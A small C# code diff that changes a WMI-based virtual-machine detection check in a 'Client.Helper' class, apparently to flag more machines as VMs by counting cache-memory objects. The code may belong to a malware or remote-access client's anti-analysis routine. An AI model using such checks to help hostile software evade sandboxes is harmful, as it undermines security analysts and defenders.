@@ -23,14 +23,13 @@ namespace Client.Helper
         }
         public static bool isVM_by_wim_temper()
         {            
-            //SelectQuery selectQuery = new SelectQuery("Select * from Win32_Fan");
             SelectQuery selectQuery = new SelectQuery("Select * from Win32_CacheMemory");
             //SelectQuery selectQuery = new SelectQuery("Select * from CIM_Memory");
             ManagementObjectSearcher searcher = new ManagementObjectSearcher(selectQuery);
             int i = 0;
             foreach (ManagementObject DeviceID in searcher.Get()) 
                 i++;
-            return (i == 0);
+            return (i < 2);
         }
     }
 }
